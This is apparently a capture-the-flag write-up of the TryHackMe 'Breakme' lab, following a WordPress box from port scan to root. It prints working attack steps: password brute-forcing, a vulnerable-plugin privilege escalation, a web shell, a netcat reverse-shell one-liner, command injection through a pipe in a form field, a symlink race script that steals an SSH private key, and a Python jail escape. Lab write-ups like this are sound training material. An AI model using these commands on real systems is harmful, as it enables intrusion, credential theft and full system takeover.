# Breakme

---

Platform: Tryhackme

Difficulty: Medium

Date: 07/07/2025

Status: Rooted

---

Nmap scan:

```html
┌──(ghost㉿kali)-[~/tryhackme/breakme]
└─$ sudo nmap -Pn -O -sC -A -p- --min-rate=3000 10.10.172.92 -oN nmap.full
[sudo] password for ghost: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 04:44 EDT
Nmap scan report for 10.10.172.92
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 8e:4f:77:7f:f6:aa:6a:dc:17:c9:bf:5a:2b:eb:8c:41 (RSA)
|   256 a3:9c:66:73:fc:b9:23:c0:0f:da:1d:c9:84:d6:b1:4a (ECDSA)
|_  256 6d:c2:0e:89:25:55:10:a9:9e:41:6e:0d:81:9a:17:cb (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Port 22: Openssh
- Port 80: http Apache httpd 2.4.56 ((Debian))

### Port 80:

Here, it displays default apache page.

![image](https://github.com/user-attachments/assets/c3f5af77-3c77-4d29-9526-cd0f342a1dfb)

While fuzzing the application’s directories, we found /wordpress endpoint.

```bash
┌──(ghost㉿kali)-[~/tryhackme/breakme]
└─$ ffuf -u http://10.10.172.92/FUZZ -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -ic
```

![image 1](https://github.com/user-attachments/assets/18e9c6a6-a16f-4eff-8a0a-7e83b549e752)

At  /wordpress endpoint, we discover a breakme website running on wordpress.

![image 2](https://github.com/user-attachments/assets/903a5156-8cff-4498-9826-373e9644ad39)

---

### Wordpress Enumeration

Let’s quickly enumerate the application with wpscan.

```bash
┌──(ghost㉿kali)-[~/tryhackme/breakme]
└─$ wpscan --url http://10.10.172.92/wordpress/ -e ap, vt --force --api-token REDACTED
```

Two things cathes my eyes in the output

1. [+] WordPress version 6.4.3 identified (Insecure, released on 2024-01-30)
    
    ![image 3](https://github.com/user-attachments/assets/34f1ad49-d378-4ad9-a5fe-e00ad1fc8f04)

2. wp-data-access plugin Version: 5.3.5
    
    ![image 4](https://github.com/user-attachments/assets/a6141635-c598-43f7-9e72-080315d99307)

Now, the only things which was remaining is username  enumeration & password bruteforce.

```bash
┌──(ghost㉿kali)-[~/tryhackme/breakme]
└─$ wpscan --url http://10.10.172.92/wordpress/ -e u --no-update -P /usr/share/wordlists/rockyou.txt
```

And we found two usernames:

1. Admin
2. Bob

![image 5](https://github.com/user-attachments/assets/7c245c13-8463-43a9-b111-c034ffcd60ad)

And also found a valid password for user bob. Let’s login with that found credentials in to wordpress dashboard at http://

![image 6](https://github.com/user-attachments/assets/ebf19c31-042e-42c8-ad14-4206ed67823f)

![image 7](https://github.com/user-attachments/assets/82213103-3ef3-4adb-8e0c-1ca09270769b)

---

### Wordpress Privilege Escalation

Now, we were redirected to wp-admin/index.php page, where we can see we don’t have enough privileges(admin privileges).

![image 8](https://github.com/user-attachments/assets/755f4db1-9e4f-4e93-861e-25106c6da22e)

Coming back to our initial findings, we noted that this application has wp-access-data’s version v5.3.5(vulnerable) plugin installed, let’s search that on google, and will try to privesc to admin.

I found a [github article](https://github.com/thomas-osgood/cve-2023-1874/blob/main/README.md) there, which is basically a python script , which will exploit target with wp-access-data v5.3.7 and earlier plugins.

![image 9](https://github.com/user-attachments/assets/7a64aa13-cb30-4fcf-851d-13ba0e6611c2)

I downloaded it in my kali machine , run that script and boom ! User bob gets admin level privileges on that application.

![image 10](https://github.com/user-attachments/assets/afd6bdbd-1e7c-4cd8-a241-6ecf9b326371)

As we can see, we gained admin level privileges to wordpress.

![image 11](https://github.com/user-attachments/assets/01764b54-fb24-4988-b14b-b846a91de670)

---

### Remote Code Execution From Wordpress

Now, to gain RCE, we can simply edit one of the `PHP` files in the theme to include a simple web shell.

![image 12](https://github.com/user-attachments/assets/c9d5a9ed-e235-4908-aab9-86612b0e364b)

![image 13](https://github.com/user-attachments/assets/01973db0-326c-4686-8723-8d823e0f8a50)

Note: I used php-reverse-shell.php from pentest monkey.

Now, we can start a listner on our kali machine and use that webshell to gain reverse shell on our machine.

```bash
┌──(ghost㉿kali)-[~/tryhackme/breakme]
└─$ rlwrap -f . -r nc -nvlp 4445
listening on [any] 4445 ...
connect to [10.17.87.131] from (UNKNOWN) [10.10.183.236] 53310
Linux Breakme 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64 GNU/Linux
 10:09:00 up 44 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

If we go to /home directory, we can see there were 2 users in this machine: 1. john 2. youcef.

First flag is in the john’s home directory, but we can’t access it now, we have to user john for that.

```bash
$ cd /home
$ ls -la
total 32
drwxr-xr-x  5 root   root  4096 Feb  3  2024 .
drwxr-xr-x 18 root   root  4096 Aug 17  2021 ..
drwxr-xr-x  4 john   john  4096 Aug  3  2023 john
drwx------  2 root   root 16384 Aug 17  2021 lost+found
drwxr-x---  4 youcef john  4096 Aug  3  2023 youcef
$ cd john
$ ls -la
total 32
drwxr-xr-x 4 john john 4096 Aug  3  2023 .
drwxr-xr-x 5 root root 4096 Feb  3  2024 ..
lrwxrwxrwx 1 john john    9 Aug  3  2023 .bash_history -> /dev/null
-rw-r--r-- 1 john john  220 Jul 31  2023 .bash_logout
-rw-r--r-- 1 john john 3526 Jul 31  2023 .bashrc
drwxr-xr-x 3 john john 4096 Jul 31  2023 .local
-rw-r--r-- 1 john john  807 Jul 31  2023 .profile
drwx------ 2 john john 4096 Feb  4  2024 internal
-rw------- 1 john john   33 Aug  3  2023 user1.txt
$ cat user1.txt
cat: user1.txt: Permission denied
```

---

### Shell as John

While checking processes running by user john , discovered that john is running a php development server locally.

```bash
www-data@Breakme:/home/john$ ps -aux | grep john
ps -aux | grep john
john         500  0.0  1.0 193800 20668 ?        Ss   09:24   0:00 /usr/bin/php -S 127.0.0.1:9999
```

Here, we can use chisel for port forwarding.

So, first of all start chisel in server mode on our kali machine.

```bash
┌──(ghost㉿kali)-[~/tryhackme/breakme]
└─$ chisel server -p 9001 --reverse
2025/07/07 10:34:38 server: Reverse tunnelling enabled
2025/07/07 10:34:38 server: Fingerprint KyxSHojL+8bi144cF5X4vICjb/wAtQ41H7ZhnJmmHxM=
2025/07/07 10:34:38 server: Listening on http://0.0.0.0:9001
```

After that, transfer chisel on target machine and run it in client mode, forwarding port 9999.

```bash
www-data@Breakme:/tmp$ wget http://10.17.87.131/chisel
wget http://10.17.87.131/chisel
--2025-07-07 10:45:18--  http://10.17.87.131/chisel
Connecting to 10.17.87.131:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9371800 (8.9M) [application/octet-stream]
Saving to: ‘chisel’

chisel              100%[===================>]   8.94M   161KB/s    in 50s     

2025-07-07 10:46:09 (182 KB/s) - ‘chisel’ saved [9371800/9371800]

www-data@Breakme:/tmp$ chmod +x chisel
chmod +x chisel
www-data@Breakme:/tmp$ chisel client 10.17.87.131:9001 R:9999:127.0.0.1:9999
chisel client 10.17.87.131:9001 R:9999:127.0.0.1:9999
bash: chisel: command not found
www-data@Breakme:/tmp$ ./chisel client 10.17.87.131:9001 R:9999:127.0.0.1:9999 &
<isel client 10.17.87.131:9001 R:9999:127.0.0.1:9999
2025/07/07 10:46:32 client: Connecting to ws://10.17.87.131:9001
2025/07/07 10:46:33 client: Connected (Latency 170.64081ms)
```

Now, we can head to 127.0.0.1:9999 on our machine and see that application run by user john.

![image 14](https://github.com/user-attachments/assets/d02e8f21-b5ac-4a70-bdaa-8f070bfca434)

This application looks like it executes command with user input. So, we can run pspy64 on target machine to get better understanding of what application does.

```bash
www-data@Breakme:/tmp$ wget http://10.17.87.131/pspy64
wget http://10.17.87.131/pspy64
--2025-07-08 05:38:30--  http://10.17.87.131/pspy64
Connecting to 10.17.87.131:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64              100%[===================>]   2.96M   653KB/s    in 5.7s    

2025-07-08 05:38:36 (530 KB/s) - ‘pspy64’ saved [3104768/3104768]

www-data@Breakme:/tmp$ chmod +x pspy64
chmod +x pspy64
www-data@Breakme:/tmp$ ./pspy64
```

Firstly, testing the check target function on that application, if we enters a ip address it run a ping command with it.

```bash
2025/07/08 05:39:08 CMD: UID=1002  PID=971    | /usr/bin/php -S 127.0.0.1:9999 
2025/07/08 05:39:08 CMD: UID=1002  PID=972    | sh -c ping -c 2 10.17.87.131 >/dev/null 2>&1 &
```

Second, If we test ‘check user’ function, it runs an id command in the background, but if we put any special characters there, it blocks them like `test;` 

```bash
2025/07/08 05:43:22 CMD: UID=1002  PID=1027   | /usr/bin/php -S 127.0.0.1:9999 
2025/07/08 05:43:22 CMD: UID=1002  PID=1028   | sh -c id test >/dev/null 2>&1 & 
```

Now, we can try a list of special characters: `~ ! @ # $ % ^ & * ( ) - _ + = { } ] [ | \ ` , . / ? ; : ' " < >` , to check which one is allowed and which one is restricted.

![image 15](https://github.com/user-attachments/assets/fdc5fa9f-03c7-4f2a-bf00-917a614c5da0)

Only `${}|./:` is allowed here, so no problem we can use pipe`|` to make our payload and will try to execute a shell.

First we have to create a bash script with a reverse shell payload.

```bash
www-data@Breakme:/dev/shm$ echo '#!/bin/bash' > rev.sh
echo '#!/bin/bash' > rev.sh
www-data@Breakme:/dev/shm$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.17.87.131 4444 >/tmp/f' >> rev.sh
<ash -i 2>&1|nc 10.17.87.131 4444 >/tmp/f' >> rev.sh
www-data@Breakme:/dev/shm$ cat rev.sh
cat rev.sh
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.17.87.131 4444 >/tmp/f
```

Now, put `|/dev/shm/rev.sh|` in that ‘check user’ function and start your netcat listner to get the john’s shell.

![image 16](https://github.com/user-attachments/assets/556b3e70-3a91-47d6-bae1-8fa178d5c65b)

```bash
┌──(ghost㉿kali)-[~/tryhackme/breakme]
└─$ rlwrap -f . -r nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.17.87.131] from (UNKNOWN) [10.10.233.108] 40510
bash: cannot set terminal process group (538): Inappropriate ioctl for device
bash: no job control in this shell
john@Breakme:~/internal$ pwd
/home/john/internal
john@Breakme:~/internal$ cd ~
john@Breakme:~$ ls -la
ls -la
total 32
drwxr-xr-x 4 john john 4096 Jul  8 07:18 .
drwxr-xr-x 5 root root 4096 Feb  3  2024 ..
lrwxrwxrwx 1 john john    9 Aug  3  2023 .bash_history -> /dev/null
-rw-r--r-- 1 john john  220 Jul 31  2023 .bash_logout
-rw-r--r-- 1 john john 3526 Jul 31  2023 .bashrc
lrwxrwxrwx 1 john john   24 Jul  8 07:18 file -> /home/youcef/.ssh/id_rsa
drwx------ 2 john john 4096 Jul  8 07:18 internal
drwxr-xr-x 3 john john 4096 Jul 31  2023 .local
-rw-r--r-- 1 john john  807 Jul 31  2023 .profile
-rw------- 1 john john   33 Aug  3  2023 user1.txt
john@Breakme:~$ cat user1.txt
cat user1.txt
5c3ea0d31256.....REDACTED
```

---

### Shell as youcef

Check the home directoy of user youcef, found a SUID binary `readfile` owned by youcef that we can run.

```bash
john@Breakme:/home/youcef$ ls -la
ls -la
total 52
drwxr-x--- 4 youcef john    4096 Aug  3  2023 .
drwxr-xr-x 5 root   root    4096 Feb  3  2024 ..
lrwxrwxrwx 1 youcef youcef     9 Aug  3  2023 .bash_history -> /dev/null
-rw-r--r-- 1 youcef youcef   220 Aug  1  2023 .bash_logout
-rw-r--r-- 1 youcef youcef  3526 Aug  1  2023 .bashrc
drwxr-xr-x 3 youcef youcef  4096 Aug  1  2023 .local
-rw-r--r-- 1 youcef youcef   807 Aug  1  2023 .profile
-rwsr-sr-x 1 youcef youcef 17176 Aug  2  2023 readfile
-rw------- 1 youcef youcef  1026 Aug  2  2023 readfile.c
drwx------ 2 youcef youcef  4096 Aug  5  2023 .ssh
```

Download this file via netcat to our kali machine to analyse.

```bash
┌──(ghost㉿kali)-[~/tryhackme/breakme]
└─$ nc -lvnp 443 > readfile

john@Breakme:~/internal$ nc 10.17.87.131 443 < /home/youcef/readfile
```

After analysing that file with ghidra, we and up with:

```bash
if (argc != 2) {
    puts("Usage: ./readfile <FILE>");
    return 1;
} else if (access(argv[1], F_OK)) {  // checks if the file exists
    puts("File Not Found");
    return 1;
} else if (getuid() != 1002) {	// checks the running user is john
    puts("You can't run this program");
    return 1;
} else {
    includes_flag = strstr(argv[1], "flag");     // checks if the supplied argument includes "flag"
    includes_id_rsa = strstr(argv[1], "id_rsa"); // checks if the supplied argument includes "id_rsa"

    lstat(argv[1], &stat_buf);
    is_symlink = (stat_buf.st_mode & S_IFMT) == S_IFLNK;  // checks if the supplied file is a SYMLINK

    can_read = access(argv[1], R_OK);  // checks if the user john can read the supplied file
    
    usleep(0);	// will cause a delay
    
    if (!includes_flag && !includes_id_rsa && can_read != -1 && !is_symlink) // if it does not include "flag" or "id_rsa"
    {                                                                        // is not a symlink and john can read it
        puts("I guess you won!\n");											   
        fd = open(argv[1], O_RDONLY);  // open the file for reading                    
        
        if (fd < 0) {
            assert(fd >= 0 && "Failed to open the file");
        }
        
        do {
            bytes_read = read(fd, file_content_buf, 1024);  // read and print the file in chunks of 1024 bytes
            if (bytes_read < 1) break;
            bytes_written = write(STDOUT_FILENO, file_content_buf, bytes_read);
        } while (bytes_written > 0);
        
        return 0;
    }
    
    puts("Nice try!");
    return 1;
}
```

Summary of the code:

- Requires **exactly one argument** (the filename).
- Verifies the file exists.
- Verifies the program is run by user with UID `1002` (e.g., user `john`).
- Denies access to files whose name includes **"flag"** or **"id_rsa"**.
- Denies **symbolic links**.
- Denies unreadable files.
- If all checks pass, it prints the contents of the file.

The issue here is that there is a delay between the `Time of Check` and `Time of Use` due to `usleep`, which creates a race condition vulnerability.

To exploit this race condition vulnerability, we can create a file and constantly switch it between a regular file and a symlink pointing to the file we want to read as `youcef`. This way, we are hoping for that while the application performs the checks, it will see a regular file and we will pass the checks. However, when it comes time to open and read, it will be a `symlink` pointing to the file we actually want to read.

For this, we will first use a loop to constantly switch the file between these two states and run it in the background.

```bash
while true; do 
    touch file;                         # 1. Create a legit regular file named "file"
    sleep 0.3;                          # 2. Wait a bit (likely for the program to pass lstat check)
    ln -sf /home/youcef/.ssh/id_rsa file; # 3. Replace it with a symlink to a sensitive file
    sleep 0.3;                          # 4. Wait for open() call to happen
    rm file;                            # 5. Clean up to retry
done &

```

Now, we will create another loop that continuously runs the program, hoping to win the race condition. If we succeed, it will print the output and exit.

```bash
while true; do
    out=$(/home/youcef/readfile file | grep -Ev 'Found|guess' | grep .)
    if [[ -n "$out" ]]; then
        echo -e "$out"
        break
    fi
done
```

Now, let’s try this and yepp! we win the race and manage to read the file `/home/youcef/.ssh/id_rsa`

```bash
john@Breakme:~$ while true; do touch file; sleep 0.3; ln -sf /home/youcef/.ssh/id_rsa file; sleep 0.3; rm file; done &
<youcef/.ssh/id_rsa file; sleep 0.3; rm file; done &
[1] 8216
john@Breakme:~$ while true; do out=$(/home/youcef/readfile file | grep -Ev 'Found|guess'| grep .);if [[ -n "$out" ]]; then echo -e "$out"; break; fi; done
< -n "$out" ]]; then echo -e "$out"; break; fi; done
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCGzrHvF6
Tuf+ZdUVQpV+cXAAAAEAAAAAEAAAILAAAAB3NzaC1yc2EAAAADAQABAAAB9QCwwxfZdy0Z
.....
g6a2xx9zV89mfWvuvrXDBX2VkdnvdvDHQRx+3SElSk1k3Votzw/q383ta6Jl3EC/1Uh8RT
TabCXd2Ji/Y7UvM=
-----END OPENSSH PRIVATE KEY-----
```

We can copy paste this rsa content into a file named id_rsa on our machine and can connect to youcef via ssh.

```bash
┌──(ghost㉿kali)-[~/tryhackme/breakme]
└─$ mousepad id_rsa

┌──(ghost㉿kali)-[~/tryhackme/breakme]
└─$ chmod 600 id_rsa                                                                                                                          
┌──(ghost㉿kali)-[~/tryhackme/breakme]
└─$ ssh -i id_rsa youcef@10.10.233.108
Enter passphrase for key 'id_rsa': 
```

We have to crack those passphrase hash via ssh2john.

```bash
┌──(ghost㉿kali)-[~/tryhackme/breakme]
└─$ ssh2john id_rsa > pass.hash                                                                                                                                  
┌──(ghost㉿kali)-[~/tryhackme/breakme]
└─$ john pass.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REDACTED          (id_rsa)     
1g 0:00:00:16 DONE (2025-07-08 06:41) 0.05927g/s 39.83p/s 39.83c/s 39.83C/s sunshine1..kelly
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now, try to login again to youcef.

```bash
┌──(ghost㉿kali)-[~/tryhackme/breakme]
└─$ ssh -i id_rsa youcef@10.10.233.108                        
Enter passphrase for key 'id_rsa': 
Linux Breakme 5.10.0-8-amd64 #1 SMP Debian 5.10.46-4 (2021-08-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Mar 21 07:55:16 2024 from 192.168.56.1
youcef@Breakme:~$ id
uid=1000(youcef) gid=1000(youcef) groups=1000(youcef)
youcef@Breakme:~$ cd .ssh
youcef@Breakme:~/.ssh$ ls
authorized_keys  id_rsa  user2.txt
youcef@Breakme:~/.ssh$ cat user2.txt
df5b1b7f4f7....REDACTED
```

---

### Shell as root

While checking the sudo privileges, we can see that we can run `/root/jail.py` with python3 as root.

```bash
youcef@Breakme:~/.ssh$ sudo -l
Matching Defaults entries for youcef on breakme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User youcef may run the following commands on breakme:
    (root) NOPASSWD: /usr/bin/python3 /root/jail.py
```

Running it informs us that we are inside a Python jail and asks for our input.

```bash
youcef@Breakme:~/.ssh$ sudo /usr/bin/python3 /root/jail.py
  Welcome to Python jail  
  Will you stay locked forever  
  Or will you BreakMe  
>> id
>> print('hello')
hello
```

Here, after a lot of trial and error, i stuck and found [writeup of jaxafed](https://jaxafed.github.io/posts/tryhackme-breakme/#escaping-the-jail) on this machine, and it was the best to understand, how that jail was working behind the scenes.

Finally tried payload from that writeup and be able to get root shell.

```bash
youcef@Breakme:~/.ssh$ sudo /usr/bin/python3 /root/jail.py
  Welcome to Python jail  
  Will you stay locked forever  
  Or will you BreakMe  
>> print(__builtins__.__dict__['__IMPORT__'.casefold()]('OS'.casefold()).__dict__['SYSTEM'.casefold()])
<built-in function system>
>> __builtins__.__dict__['__IMPORT__'.casefold()]('OS'.casefold()).__dict__['SYSTEM'.casefold()]('/lib/yorick/bin/yorick')
 Copyright (c) 2005.  The Regents of the University of California.
 All rights reserved.  Yorick 2.2.04 ready.  For help type 'help'
 > system, "bash"
 root@Breakme:/home/youcef/.ssh# id
 uid=0(root) gid=0(root) groups=0(root)
 root@Breakme:/home/youcef/.ssh# cd /root
root@Breakme:~# ls
index.php  jail.py
root@Breakme:~# ls -la
total 52
drwx------  3 root root 4096 Mar 21  2024 .
drwxr-xr-x 18 root root 4096 Aug 17  2021 ..
lrwxrwxrwx  1 root root    9 Aug  3  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
-rwx------  1 root root 5438 Jul 31  2023 index.php
-rw-r--r--  1 root root 5000 Mar 21  2024 jail.py
-rw-r--r--  1 root root    0 Mar 21  2024 .jail.py.swp
-rw-------  1 root root   33 Aug  3  2023 .lesshst
drwxr-xr-x  3 root root 4096 Aug 17  2021 .local
-rw-------  1 root root 7575 Feb  4  2024 .mysql_history
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-------  1 root root   33 Aug  3  2023 .root.txt
root@Breakme:~# cat .root.txt
e257d5848141.....REDACTED
```

That’s it for this machine.✅
